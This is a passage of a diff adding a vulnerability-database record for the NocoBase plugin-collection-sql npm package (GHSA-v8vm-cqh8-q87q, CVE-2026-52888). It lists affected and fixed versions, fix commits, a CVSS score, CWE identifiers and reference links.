+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0-beta.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.0
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.35
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.36
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.37
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.38
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.39
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.40
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.41
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.42
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.43
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.44
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.45
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.46
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.47
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.48
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.49
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.50
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.51
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.52
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.53
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.54
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.55
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.56
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.57
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.58
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.59
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.60
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.61
+    fixed_packages:
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.0.62
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40nocobase/plugin-collection-sql
+    affected_versions: vers:npm/>=2.1.0-alpha.1|<2.1.0-alpha.46
+    fixed_versions: vers:npm/2.1.0-alpha.46
+    affected_packages:
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.3
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.4
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.18
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.28
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.31
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.35
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.36
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.37
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.38
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.39
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.40
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.45
+    fixed_packages:
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-alpha.46
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:npm/%40nocobase/plugin-collection-sql
+    affected_versions: vers:npm/>=2.1.0-beta.1|<2.1.0-beta.45
+    fixed_versions: vers:npm/2.1.0-beta.45
+    affected_packages:
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.1
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.2
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.5
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.6
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.7
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.8
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.9
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.10
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.11
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.12
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.13
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.14
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.15
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.16
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.17
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.19
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.20
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.21
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.22
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.23
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.24
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.25
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.26
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.27
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.29
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.30
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.32
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.33
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.34
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.35
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.36
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.37
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.38
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.40
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.41
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.42
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.43
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.44
+    fixed_packages:
+      - pkg:npm/%40nocobase/plugin-collection-sql@2.1.0-beta.45
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/nocobase/nocobase
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/nocobase/nocobase
+        commit: 87c548969ce9258dd7f0d9571c9453ae10bc3fc4
+        patch_text:
+      - vcs_url: https://github.com/nocobase/nocobase
+        commit: 4aecb60d151a9002004dcf984f63d62f17a6cb45
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '6.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-v8vm-cqh8-q87q/GHSA-v8vm-cqh8-q87q.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-200
+  - CWE-184
+references:
+  - url: https://github.com/nocobase/nocobase
+    reference_type:
+    reference_id:
+  - url: https://github.com/nocobase/nocobase/commit/4aecb60d151a9002004dcf984f63d62f17a6cb45
+    reference_type:
+    reference_id:
+  - url: https://github.com/nocobase/nocobase/commit/87c548969ce9258dd7f0d9571c9453ae10bc3fc4
+    reference_type:
+    reference_id:
+  - url: https://github.com/nocobase/nocobase/pull/9683
+    reference_type:
+    reference_id:
+  - url: https://github.com/nocobase/nocobase/releases/tag/v2.0.62
+    reference_type:
+    reference_id:
+  - url: https://github.com/nocobase/nocobase/releases/tag/v2.1.0-alpha.46
+    reference_type:
+    reference_id:
+  - url: https://github.com/nocobase/nocobase/security/advisories/GHSA-v8vm-cqh8-q87q
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-52888
+    reference_type:
+    reference_id: CVE-2026-52888
+exploits: []
